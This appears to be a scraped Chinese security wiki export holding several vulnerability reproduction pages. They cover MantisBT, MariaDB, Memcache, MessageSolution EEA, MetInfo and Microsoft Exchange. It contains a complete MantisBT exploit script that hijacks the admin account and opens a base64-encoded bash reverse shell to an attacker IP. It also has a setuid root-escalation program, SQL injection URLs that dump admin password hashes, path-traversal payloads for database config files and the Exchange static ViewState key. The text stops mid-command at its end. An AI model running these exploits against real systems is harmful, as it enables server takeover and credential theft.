远程命令执行漏洞/（CVE-2019-15715）MantisBT 远程命令执行漏洞.html","title":"（CVE-2019-15715）MantisBT 远程命令执行漏洞","keywords":"","body":"（CVE-2019-15715）MantisBT 远程命令执行漏洞 一、漏洞简介 该漏洞源于外部输入数据构造操作系统可执行命令过程中，网络系统或产品未正确过滤其中的特殊字符、命令等。攻击者可利用该漏洞执行非法操作系统命令。 二、漏洞影响 MantisBT 1.3.20 - 2.22.1 三、复现过程 poc 使用方法 kali@kali:~/Desktop$ python exploit.py Successfully hijacked account! Successfully logged in! Triggering reverse shell Cleaning up Deleting the dot_tool config. Deleting the relationship_graph_enable config. Successfully cleaned up kali@kali:~/Desktop$ nc -nvlp 4444 listening on [any] 4444 ... connect to [192.168.116.135] from (UNKNOWN) [192.168.116.151] 43978 bash: cannot set terminal process group (835): Inappropriate ioctl for device bash: no job control in this shell www-data@ubuntu:/var/www/html/mantisbt-2.3.0$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) CVE-2019-15715.py # Exploit Title: Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated) # Date: 2020-09-17 # Vulnerability Discovery: hyp3rlinx, permanull # Exploit Author: Nikolas Geiselman # Vendor Homepage: https://mantisbt.org/ # Software Link: https://mantisbt.org/download.php # Version: 1.3.0/2.3.0 # Tested on: Ubuntu 16.04/19.10/20.04 # CVE : CVE-2017-7615, CVE-2019-15715 # References: # https://mantisbt.org/bugs/view.php?id=26091 # https://www.exploit-db.com/exploits/41890 ''' This exploit chains together two CVE's to achieve unauthenticated remote code execution. The first portion of this exploit resets the Administrator password (CVE-2017-7615) discovered by John Page a.k.a hyp3rlinx, this portion was modified from the original https://www.exploit-db.com/exploits/41890. The second portion of this exploit takes advantage of a command injection vulnerability (CVE-2019-15715) discovered by 'permanull' (see references). Usage: Set netcat listener on port 4444 Send exploit with \"python exploit.py\" Example output: kali@kali:~/Desktop$ python exploit.py Successfully hijacked account! Successfully logged in! Triggering reverse shell Cleaning up Deleting the dot_tool config. Deleting the relationship_graph_enable config. Successfully cleaned up kali@kali:~/Desktop$ nc -nvlp 4444 listening on [any] 4444 ... connect to [192.168.116.135] from (UNKNOWN) [192.168.116.151] 43978 bash: cannot set terminal process group (835): Inappropriate ioctl for device bash: no job control in this shell www-data@ubuntu:/var/www/html/mantisbt-2.3.0$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) ''' import requests from urllib import quote_plus from base64 import b64encode from re import split class exploit(): def __init__(self): self.s = requests.Session() self.headers = dict() # Initialize the headers dictionary self.RHOST = \"192.168.116.151\" # Victim IP self.RPORT = \"80\" # Victim port self.LHOST = \"192.168.116.135\" # Attacker IP self.LPORT = \"4444\" # Attacker Port self.verify_user_id = \"1\" # User id for the target account self.realname = \"administrator\" # Username to hijack self.passwd = \"password\" # New password after account hijack self.mantisLoc = \"/mantisbt-2.3.0\" # Location of mantis in URL self.ReverseShell = \"echo \" + b64encode( \"bash -i >& /dev/tcp/\" + self.LHOST + \"/\" + self.LPORT + \" 0>&1\") + \" | base64 -d | /bin/bash\" # Reverse shell payload def reset_login(self): # Request # 1: Grab the account update token url = 'http://' + self.RHOST + \":\" + self.RPORT + self.mantisLoc + '/verify.php?id=' + self.verify_user_id + '&confirm_hash=' r = self.s.get(url=url, headers=self.headers) if r.status_code == 404: print \"ERROR: Unable to access password reset page\" exit() account_update_token = r.text.split('name=\"account_update_token\" value=')[1].split('\"')[1] # Request # 2: Reset the account password url = 'http://' + self.RHOST + \":\" + self.RPORT + self.mantisLoc + '/account_update.php' data = \"account_update_token=\" + account_update_token + \"&password=\" + self.passwd + \"&verify_user_id=\" + self.verify_user_id + \"&realname=\" + self.realname + \"&password_confirm=\" + self.passwd self.headers.update({'Content-Type': 'application/x-www-form-urlencoded'}) r = self.s.post(url=url, headers=self.headers, data=data) if r.status_code == 200: print \"Successfully hijacked account!\" def login(self): data = \"return=index.php&username=\" + self.realname + \"&password=\" + self.passwd + \"&secure_session=on\" url = 'http://' + self.RHOST + \":\" + self.RPORT + self.mantisLoc + '/login.php' r = self.s.post(url=url, headers=self.headers, data=data) if \"login_page.php\" not in r.url: print \"Successfully logged in!\" def CreateConfigOption(self, option, value): # Get adm_config_set_token url = 'http://' + self.RHOST + \":\" + self.RPORT + self.mantisLoc + '/adm_config_report.php' r = self.s.get(url=url, headers=self.headers) adm_config_set_token = r.text.split('name=\"adm_config_set_token\" value=')[1].split('\"')[1] # Create config data = \"adm_config_set_token=\" + adm_config_set_token + \"&user_id=0&original_user_id=0&project_id=0&original_project_id=0&config_option=\" + option + \"&original_config_option=&type=0&value=\" + quote_plus( value) + \"&action=create&config_set=Create+Configuration+Option\" url = 'http://' + self.RHOST + \":\" + self.RPORT + self.mantisLoc + '/adm_config_set.php' r = self.s.post(url=url, headers=self.headers, data=data) def TriggerExploit(self): print \"Triggering reverse shell\" url = 'http://' + self.RHOST + \":\" + self.RPORT + self.mantisLoc + '/workflow_graph_img.php' try: r = self.s.get(url=url, headers=self.headers, timeout=3) except: pass def Cleanup(self): # Delete the config settings that were created to send the reverse shell print \"Cleaning up\" cleaned_up = False cleanup = requests.Session() CleanupHeaders = dict() CleanupHeaders.update({'Content-Type': 'application/x-www-form-urlencoded'}) data = \"return=index.php&username=\" + self.realname + \"&password=\" + self.passwd + \"&secure_session=on\" url = 'http://' + self.RHOST + \":\" + self.RPORT + self.mantisLoc + '/login.php' r = cleanup.post(url=url, headers=CleanupHeaders, data=data) ConfigsToCleanup = ['dot_tool', 'relationship_graph_enable'] for config in ConfigsToCleanup: # Get adm_config_delete_token url = \"http://\" + self.RHOST + \":\" + self.RPORT + self.mantisLoc + \"/adm_config_report.php\" r = cleanup.get(url=url, headers=self.headers) test = split('', r.text) # First element of the response list is garbage, delete it del test[0] cleanup_dict = dict() for i in range(len(test)): if config in test[i]: cleanup_dict.update({'config_option': config}) cleanup_dict.update({'adm_config_delete_token': test[i].split('name=\"adm_config_delete_token\" value=')[1].split('\"')[1]}) cleanup_dict.update({'user_id': test[i].split('name=\"user_id\" value=')[1].split('\"')[1]}) cleanup_dict.update({'project_id': test[i].split('name=\"project_id\" value=')[1].split('\"')[1]}) # Delete the config print \"Deleting the \" + config + \" config.\" url = \"http://\" + self.RHOST + \":\" + self.RPORT + self.mantisLoc + \"/adm_config_delete.php\" data = \"adm_config_delete_token=\" + cleanup_dict['adm_config_delete_token'] + \"&user_id=\" + cleanup_dict[ 'user_id'] + \"&project_id=\" + cleanup_dict['project_id'] + \"&config_option=\" + cleanup_dict[ 'config_option'] + \"&_confirmed=1\" r = cleanup.post(url=url, headers=CleanupHeaders, data=data) # Confirm if actually cleaned up r = cleanup.get(url=\"http://\" + self.RHOST + \":\" + self.RPORT + self.mantisLoc + \"/adm_config_report.php\", headers=CleanupHeaders, verify=False) if config in r.text: cleaned_up = False else: cleaned_up = True if cleaned_up == True: print \"Successfully cleaned up\" else: print \"Unable to clean up configs\" exploit = exploit() exploit.reset_login() exploit.login() exploit.CreateConfigOption(option=\"relationship_graph_enable\", value=\"1\") exploit.CreateConfigOption(option=\"dot_tool\", value=exploit.ReverseShell + ';') exploit.TriggerExploit() exploit.Cleanup() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:27 "},"Web安全/Mariadb/（CVE-2020-7221）Mariadb 提权漏洞/（CVE-2020-7221）Mariadb 提权漏洞.html":{"url":"Web安全/Mariadb/（CVE-2020-7221）Mariadb 提权漏洞/（CVE-2020-7221）Mariadb 提权漏洞.html","title":"（CVE-2020-7221）Mariadb 提权漏洞","keywords":"","body":"（CVE-2020-7221）Mariadb 提权漏洞 一、漏洞简介 MariaDB 10.4.7到10.4.11中的mysql_install_db允许将特权从mysql用户帐户升级到root用户，因为chown和chmod的执行不安全，如对auth_pam_tool_dir / auth_pam_tool的chmod 04755的symlink攻击所证明的那样。注意：这不会影响Oracle MySQL产品，该产品以不同的方式实现mysql_install_db。 二、漏洞影响 Mariadb 10.4.7到10.4.11 三、复现过程 docker环境搭建： docker pull mariadb:10.4.8 docker run -it 2ef19234ff46 /bin/bash 漏洞分析 首先定位漏洞点。 find / -name \"mysql_install_db\" Mariadb提权漏洞/media/rId26.png) 在bash脚本上下文中，如果$user被定义则能进入「配置不当」漏洞点。 chown $user \"$pamtooldir/auth_pam_tool_dir\" chmod 0700 \"$pamtooldir/auth_pam_tool_dir\" 这里配置了auth_pam_tool_dir目录的归属权和所有权，权限归属于$user。 （这里是可控点之一） chown 0 \"$pamtooldir/auth_pam_tool_dir/auth_pam_tool\" chmod 04755 \"$pamtooldir/auth_pam_tool_dir/auth_pam_tool\" 这里配置了auth_pam_tool文件为0（root）所有权，4755文件权限（4为suid权限）。想要进入这个漏洞点需要$srcdir变量值长度为0才能触发。 关于suid属性： SUID属性一般用在可执行文件上，当用户执行该文件时，会「临时拥有该执行文件的所有者权限」。一旦程序拥有SUID权限的话，运行该程序时会以最高权限运行。 回溯 $srcdir 与 $user $user Mariadb提权漏洞/media/rId28.png) 在脚本传递args参数时可控制$user变量。 $srcdir Mariadb提权漏洞/media/rId29.png) 也在初始化操作时可控制变量，初始化时为空。 那么想要进入这个漏洞点需要$srcdir为空，$user需要设置值。 结合上文描述使用此命令才能触发漏洞点： ./mysql_install_db --user=mysql 漏洞复现 寻找suid属性的程序 find /* -perm -u=s -type f 2>/dev/null 搜索到的suid属性程序「auth_pam_tool」替换成我们的恶意suid程序。 1. rm auth_pam_tool 2. ln -s /root/pwn auth_pam_tool 3. export PATH=.:$PATH 4. ln -s /bin/bash ps 编写一个具有suid权限的恶意程序： #include #include int main(void) { setuid(0); setgid(0); system(\"ps\"); return 0; } Mariadb提权漏洞/media/rId31.png) 切换回root，在root权限下运行mysql_install_db脚本（触发修改chmod命令） Mariadb提权漏洞/media/rId32.png) 再回到mysql用户权限下执行auth_pam_tool Mariadb提权漏洞/media/rId33.png) 提权成功。 可以看到这个漏洞是由于suid与目录权限设置不当，才导致被提权利用的风险。建议在修复中设置auth_pam_tool_dir目录权限为root所有： root:mysql 0750 /usr/lib/mysql/plugin/auth_pam_tool_dir 参考链接 https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247486415&idx=1&sn=0e413fdfd22f21580e0c70251e53a7cb&chksm=fe7a2f57c90da64190913e4f40d5f854dcc0c794ac988ce667f1ba0d4a262575b5c4a67b65a1&mpshare=1&scene=1&srcid=&sharer_sharetime=1582037009796&sharer_shareid=346bf064ccfaeb680ec3e1af3a4fc9a8&key=36a0b0f21e7aca1c7ade662e9184d730b9617a817ebf64e5bbc6048142797fa6b31c917039b5d1308f1d16cf77ba9f43d541a1bd197ead9b66bb01969c4f1bf2c54e19862f1f9bc1f449495c27554e90&ascene=1&uin=MTU0OTU5NDkzMA%3D%3D&devicetype=Windows+10&version=62080079&lang=zh_CN&exportkey=AUm27aB0HayWjmPDBsXi7NU%3D&pass_ticket=VkgA7hk5gRtBGyr1o4%2Bh5PlNbfx095JODofk2U16AOMJewFkqv%2BeZkeziLm0G2um Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:28 "},"Web安全/Memcache/Memcache未授权访问/Memcache未授权访问.html":{"url":"Web安全/Memcache/Memcache未授权访问/Memcache未授权访问.html","title":"Memcache未授权访问","keywords":"","body":"Memcache未授权访问 一、漏洞简介 memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。 二、影响范围 三、复现过程 1.扫描探测 nmap -sV -p 11211 --script memcached-info 0.0.0.0 ##! /usr/bin/env python ## _*_ coding:utf-8 _*_ def Memcache_check(ip, port=11211, timeout=5): try: socket.setdefaulttimeout(timeout) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, int(port))) s.send(\"stats\\r\\n\") result = s.recv(1024) if \"STAT version\" in result: print '[+] Memcache Unauthorized: ' +ip+':'+str(port) except Exception, e: pass if __name__ == '__main__': Elasticsearch_check(\"127.0.0.1\") 2.攻击利用 2.1 基础部分 通过一个cheat sheet了解一下Memcached的协议。Memcached的语法由如下元素组成 {COMMAND}0x20{ARGUMENT}(LF|CRLF) command字段有如下几条命令 存储操作(set, add, replace, append, prepend, cas) 检索操作 (get, gets) 删除操作 (delete) 增减操作 (incr, decr) touch slabs reassign slabs automove lru_crawler 统计操作(stats items, slabs, cachedump) 其他操作 (version, flush_all, quit) Command 描述 实例 get 读某个值 get mykey set 强制设置某个键值 set mykey 0 60 5 add 添加新键值对 add newkey 0 60 5 replace 覆盖已经存在的key replace key 0 60 5 flush_all 让所有条目失效 flush_all stats 打印当前状态 stats stats malloc 打印内存状态 stats malloc version | 打印Memcached版本 | version stats //查看memcache 服务状态 stats items //查看所有items stats cachedump 32 0 //获得缓存key get :state:264861539228401373:261588 //通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露 2.2 建立连接并获取信息 telnet 11211，或 nc -vv 11211，无需用户名密码，可以直接连接memcache 服务的11211端口。 附赠大佬写的文章 Discuz!因Memcached未授权访问导致的RCE 3.防范措施 1.限制访问 如果memcache没有对外访问的必要，可在memcached启动的时候指定绑定的ip地址为 127.0.0.1。其中 -l 参数指定为本机地址。例如： memcached -d -m 1024 -u root -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid 或者 vim /etc/sysconfig/memcached，修改配置文件 OPTIONS=\\\"-l 127.0.0.1\\\"，只能本机访问，不对公网开放，保存退出 /etc/init.d/memcached reload 2.防火墙 // accept ## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 11211 -j ACCEPT ## iptables -A INPUT -p udp -s 127.0.0.1 --dport 11211 -j ACCEPT // drop ## iptables -I INPUT -p tcp --dport 11211 -j DROP ## iptables -I INPUT -p udp --dport 11211 -j DROP // 保存规则并重启 iptables ## service iptables save ## service iptables restart 3.使用最小化权限账号运行Memcached服务 使用普通权限账号运行，指定Memcached用户。 memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid 4.启用认证功能 Memcached本身没有做验证访问模块,Memcached从1.4.3版本开始，能支持SASL认证。SASL认证详细配置手册 5.修改默认端口 修改默认11211监听端口为11222端口。在Linux环境中运行以下命令： memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid 6.定期升级 参考: http://lzone.de/cheat-sheet/memcached https://www.secpulse.com/archives/49659.html https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/ https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf http://niiconsulting.com/checkmate/2013/05/memcache-exploit/ https://xz.aliyun.com/t/2018 http://drops.xmd5.com/static/drops/web-8987.html https://blog.csdn.net/microzone/article/details/79262549\\ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:31 "},"Web安全/MessageSolution/MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543/MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543.html":{"url":"Web安全/MessageSolution/MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543/MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543.html","title":"MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543","keywords":"","body":"MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543 漏洞描述 MessageSolution企业邮件归档管理系统 EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用WEB信息泄漏，泄露Windows服务器administrator hash与web账号密码 漏洞影响 MessageSolution 企业邮件归档管理系统EEA 漏洞复现 title=\"MessageSolution Enterprise Email Archiving (EEA)\" 登录页面如下 访问如下Url http://xxx.xxx.xxx.xxx/authenticationserverservlet/ 使用获得到的密码可以登录系统 漏洞POC @Henry4E36 师傅的POC Github里 https://github.com/Henry4E36/CNVD-2021-10543 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: MessageSolution 企业邮件归档管理系统EEA \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/authenticationserverservlet/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if response.status_code == 200 and \"administrator\" in response.text: print(\"\\033[32m[o] 目标 {} 存在信息泄露 响应为:{}\\033[0m\".format(target_url, response.text)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) if __name__ == \"__main__\": title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:34 "},"Web安全/MetInfo/MetInfo 5.3.12 member_login.php sql注入漏洞/MetInfo 5.3.12 member_login.php sql注入漏洞.html":{"url":"Web安全/MetInfo/MetInfo 5.3.12 member_login.php sql注入漏洞/MetInfo 5.3.12 member_login.php sql注入漏洞.html","title":"MetInfo 5.3.12 member_login.php sql注入漏洞","keywords":"","body":"MetInfo 5.3.12 member/login.php sql注入漏洞 一、漏洞简介 二、漏洞影响 MetInfo 5.3.12 三、复现过程 https://www.0-sec.org/member/login.php/aa'UNION%20SELECT%20(select%20concat(admin_id,0x23,admin_pass)%20from%20met_admin_table%20limit%200,1),2,3,4,5,6,1111,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23/aa Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:35 "},"Web安全/MetInfo/Metinfo 6.1.2 SQL注入/Metinfo 6.1.2 SQL注入.html":{"url":"Web安全/MetInfo/Metinfo 6.1.2 SQL注入/Metinfo 6.1.2 SQL注入.html","title":"Metinfo 6.1.2 SQL注入","keywords":"","body":"Metinfo 6.1.2 SQL注入 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 漏洞文件：/var/www/html/metinfo6.1.2/app/system/message/web/message.class.php 漏洞函数：add 37-51行 public function add($info) { global $_M; if(!$_M[form][id]){ $message=DB::get_one(\"select * from {$_M[table][column]} where module= 7 and lang ='{$_M[form][lang]}'\"); $_M[form][id]=$message[id]; } $met_fd_ok=DB::get_one(\"select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and name= 'met_fd_ok' and columnid = {$_M[form][id]}\"); $_M[config][met_fd_ok]= $met_fd_ok[value]; if(!$_M[config][met_fd_ok])okinfo('javascript:history.back();',\"{$_M[word][Feedback5]}\"); if($_M[config][met_memberlogin_code]){ if(!load::sys_class('pin', 'new')->check_pin($_M['form']['code'])){ okinfo(-1, $_M['word']['membercode']); } } 漏洞触发点： $met_fd_ok=DB::get_one(\"select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and name= 'met_fd_ok' and columnid = {$_M[form][id]}\"); 由于无单引号过滤导致sql注入，这个时候尝试注入发现关键词全被替换了，无法注入。于是查看__controler函数发现调用了父类的初始化函数。 class feedback extends web 跟进web类，没有对用户传入的数据进行过滤等操作，却初始化了common类 class web extends common 查看Common类的初始化函数发现了问题所在 public function __construct() { global $_M;//全局数组$_M ob_start();//开启缓存 $this->load_mysql();//数据库连接 $this->load_form();//表单过滤 $this->load_lang();//加载语言配置 $this->load_config_global();//加载全站配置数据 $this->load_url_site(); $this->load_config_lang();//加载当前语言配置数据 $this->load_url();//加载url数据 } 跟踪 $this→load_form() 函数 protected function load_form() { global $_M; $_M['form'] =array(); isset($_REQUEST['GLOBALS']) && exit('Access Error'); foreach($_COOKIE as $_key => $_value) { $_key{0} != '_' && $_M['form'][$_key] = daddslashes($_value); } foreach($_POST as $_key => $_value) { $_key{0} != '_' && $_M['form'][$_key] = daddslashes($_value); } foreach($_GET as $_key => $_value) { $_key{0} != '_' && $_M['form'][$_key] = daddslashes($_value); } if(is_numeric($_M['form']['lang'])){//伪静态兼容 $_M['form']['page'] = $_M['form']['lang']; $_M['form']['lang'] = ''; } if($_M['form']['metid'] == 'list'){ $_M['form']['list'] = 1; $_M['form']['metid'] = $_M['form']['page']; $_M['form']['page'] = 1; } if(!preg_match('/^[0-9A-Za-z]+$/', $_M['form']['lang']) && $_M['form']['lang']){ echo \"No data in the database,please reinstall.\"; die(); } } 把COOKIE、POST、GET 传入 daddslashes函数进行过滤 function daddslashes($string, $force = 0) { !defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc()); if(!MAGIC_QUOTES_GPC || $force) { if(is_array($string)) { foreach($string as $key => $val) { $string[$key] = daddslashes($val, $force); } } else { if(!defined('IN_ADMIN')){ $string = trim(addslashes(sqlinsert($string))); }else{ $string = trim(addslashes($string)); } } } return $string; } 这里判断是否开启了get_magic_quotes_gpc() 如果没开启或者 $force !=0 就进入过滤。 然而最重要的环节在这里 if(!defined('IN_ADMIN')){ $string = trim(addslashes(sqlinsert($string))); }else{ $string = trim(addslashes($string)); } 判断 IN_ADMIN 常量是否已经定义了，如果没定义就使用$string = trim(addslashes(sqlinsert($string)));来过滤我们的值 而如果定义了就使用$string = trim(addslashes($string));来过滤。 刚刚我们进行sql注入测试失败而且语句被过滤了， addslashes只过滤特殊字符，所以我们肯定是被 sqlinsert函数给过滤了。导致我们无法sql注入。至于sqlinsert函数我就不贴出来了，我们要做的是饶过这个函数，而不是饶过他这个规则。 defined(\\'IN_ADMIN\\') 我们需要找这个常量在哪里定义的。其实写这句话有点多余，看过我之前几篇Metinfo漏洞的话应该就会发现问题了。我写过一个关于/admin/index.php文件任意调用带do方法的问题。 然后我们打开这个文件看一下。 没错这个常量就是在这个文件定义的。而且他可以调用任意带do方法。不过问题又来了，漏洞函数是add并且不带do，那就找调用白，于是找到 domessage这个函数。 domessage方法 18-24 public function domessage() { global $_M; if($_M['form']['action'] == 'add'){ $this->check_field(); $this→add($_M['form']); 这里在调用 add方法之前先调用了 check_field方法，我们要做的就是保证程序能够顺利执行到add方法，研究了一会发现只需要正常留言，把它传递的参数拷下来就ok了。 然后顺利执行到了add方法，成功的进行了sql注入。 payload： http:/0-sec.org/metinfo6//admin/index.php?m=web&n=message&c=message&a=domessage&action=add&lang=cn¶137=1¶186=1¶138=1¶139=1¶140=1&id=42 这里说一下这个id=42，这个值42是不能修改的，目的是让他返回验证码错误，饶过了第一层判断。 if(!$_M[config][met_fd_ok])okinfo('javascript:history.back();',\"{$_M[word][Feedback5]}\"); if($_M[config][met_memberlogin_code]){ if(!load::sys_class('pin', 'new')->check_pin($_M['form']['code'])){ okinfo(-1, $_M['word']['membercode']); } } 至于为什么让他饶过第一层判断返回验证码错误，这样的话我们可以布尔盲注，否则只能进行时间注入。这里不多解释，自己研究一下。 解决方法 修改文件：metinfo6.1.2/app/system/message/web/message.class.php 修改内容： $met_fd_ok=DB::get_one(\"select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and name= 'met_fd_ok' and columnid = {$_M[form][id]}\"); 修改为： $met_fd_ok=DB::get_one(\"select * from {$_M[table][config]} where lang ='{$_M[form][lang]}' and name= 'met_fd_ok' and columnid = ‘{$_M[form][id]}’\"); 这样就解决了。 漏洞验证脚本 https://github.com/ianxtianxt/Metinfo-6.1.2-SQL-inj Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:36 "},"Web安全/MetInfo/Metinfo任意文件读取/Metinfo任意文件读取.html":{"url":"Web安全/MetInfo/Metinfo任意文件读取/Metinfo任意文件读取.html","title":"Metinfo任意文件读取","keywords":"","body":"MetInfo 任意文件读取 一、漏洞简介 MetInfo是一套使用PHP和Mysql开发的内容管理系统。 MetInfo 6.0.0~6.1.0版本中的 old_thumb.class.php文件存在任意文件读取漏洞。攻击者可利用漏洞读取网站上的敏感文件 二、漏洞影响 MetInfo 6.0.0 MetInfo 6.1.0 三、复现过程 漏洞分析 进攻分析 看下\\MetInfo6\\app\\system\\include\\module\\old_thumb.class.php 从代码中看用看到，$dir直接由$_GET[\\'dir\\']传递进来，并将../置空。目标是进入到第一个，如果里面的readfile($dir);，读取文件。看看如果语句的条件，的英文外面一个strstr函数，判断$dir中http字符串的首次出现位置，实质上，要进入到这个if语句里面，$dir中必须包含http字符串。里面的将$dir中包含$_M[\\'url\\'][\\'site\\']的部分放置空，这里可以不用管。 从上面的分析可以构造出有效负载，只要$dir里包含http字符串就可以进入到readfile函数从而重新读取任意函数，然后可以使用..././来进行目录替换，因为../会被置空，所以最终payload如下 ?dir=..././http/..././config/config_db.php ?dir=.....///http/.....///config/config_db.php ?dir=http/.....///.....///config/config_db.php ?dir=http\\..\\..\\config\\config_db.php 漏洞复现 要先找到调用old_thumb.class.php的文件，看到include/thumb.php，可以从这个文件里面进入到old_thumb.class.php 所以我们通过thumb.php将构造好的$dir传入即可。 可以看到成功的读取到了config/config_ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:36 "},"Web安全/MetInfo/MetInfo系统中一处旧插件导致的ssrf/MetInfo系统中一处旧插件导致的ssrf.html":{"url":"Web安全/MetInfo/MetInfo系统中一处旧插件导致的ssrf/MetInfo系统中一处旧插件导致的ssrf.html","title":"MetInfo系统中一处旧插件导致的ssrf","keywords":"","body":"MetInfo系统中隐藏的一处旧插件导致的ssrf 一、漏洞简介 二、漏洞影响 三、复现过程 利用的话，ssrf嘛你可以扫描扫描端口咯。 我这里的话，简单说明利用一下 分析过程 文件：MetInfo_v6.1.0\\app\\app\\ueditor\\php\\Uploader.class.php get_headers这里是验证资源是否存在的，不存在就不走下面了，所以这里可以用来判断端口，例如81端口不存在那么他这里就会直接报错了 $this->stateInfo = $this->getStateInfo(\\\"ERROR_DEAD_LINK\\\"); 这个时候我还不清楚的$this->fileField 的值是向哪里获取的=-= 又搜索了一下。 需要注意的是：$type == \\\"remote\\\" 才能进入$this->saveRemote();流程引起漏洞触发。 搜索一下 打开文件：MetInfo_v6.1.0\\app\\app\\ueditor\\php\\action_crawler.php 打开文件以后，虽然引入了Uploader.class.php 但是没有引入$CONFIG所以直接调用代码会报错，那么就继续找引入 搜索一下 打开文件：MetInfo_v6.1.0\\app\\app\\ueditor\\php\\controller.php image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:37 "},"Web安全/Microsoft Exchange/（CVE-2020-0688）Microsoft Exchange 远程命令执行漏洞/（CVE-2020-0688）Microsoft Exchange 远程命令执行漏洞.html":{"url":"Web安全/Microsoft Exchange/（CVE-2020-0688）Microsoft Exchange 远程命令执行漏洞/（CVE-2020-0688）Microsoft Exchange 远程命令执行漏洞.html","title":"（CVE-2020-0688）Microsoft Exchange 远程命令执行漏洞","keywords":"","body":"（CVE-2020-0688）Microsoft Exchange 远程命令执行漏洞 一、漏洞简介 该漏洞是由于Exchange Control Panel(ECP)组件中使用了静态秘钥（validationKey和decryptionKey）所导致的。 所有Microsoft Exchange Server在安装后的web.config文件中都拥有相同的validationKey和decryptionKey。这些密钥用于保证ViewState的安全性。而ViewState是ASP.NET Web应用以序列化格式存储在客户机上的服务端数据。客户端通过__VIEWSTATE请求参数将这些数据返回给服务器。 经过身份验证的攻击者可以从身份验证的session中收集ViewStateUserKey，并在登录请求的原始响应中获得__VIEWSTATEGENERATOR。通过这两个值可以利用YSoSerial.net工具生成恶意的ViewState，从而在ECP中执行任意的.NET代码。由于ECP应用程序是以SYSTEM权限运行的，因而成功利用此漏洞的攻击者可以以SYSTEM身份执行任意代码，并完全控制目标Exchange服务器。 二、漏洞影响 Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 30 Microsoft Exchange Server 2013 Cumulative Update 23 Microsoft Exchange Server 2016 Cumulative Update 14 Microsoft Exchange Server 2016 Cumulative Update 15 Microsoft Exchange Server 2019 Cumulative Update 3 Microsoft Exchange Server 2019 Cumulative Update 4 三、复现过程 需要一个普通权限的登录账号 根据网上的漏洞利用方式分析，漏洞出现在Exchange Control Panel （ECP）组件中，所有Microsoft Exchange Server在安装后的web.config文件中都拥有相同的validationKey和decryptionKey。 这些密钥用于保证ViewState的安全性，而ViewState是ASP.NET Web应用以序列化格式存储在客户机上的服务端数据。由于密钥是静态的，攻击者有了这两个密钥，就可以使用 YSoSerial.net 生成序列化后的ViewState数据，从而在Exchange Control Panel web应用上执行任意.net代码。 静态的密钥在所有Microsoft Exchange Server在安装后的C:\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\ecp\\web.config文件中都是相同的： validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF validationalg = SHA1 我们要构造ViewState还需要viewstateuserkey和__VIEWSTATEGENERATOR， viewstateuserkey为用户登录后的ASP.NET_SessionId： MicrosoftExchange远程命令执行漏洞/media/rId24.png) __VIEWSTATEGENERATOR在/ecp/default.aspx的前端页面里面直接获取： MicrosoftExchange远程命令执行漏洞/media/rId25.png) 当拥有了validationkey,validationalg,viewstateuserkey,__VIEWSTATEGENERATOR，使用YSoSerial.net生成序列化后的恶意的ViewState数据： ysoserial.exe -p ViewState -g 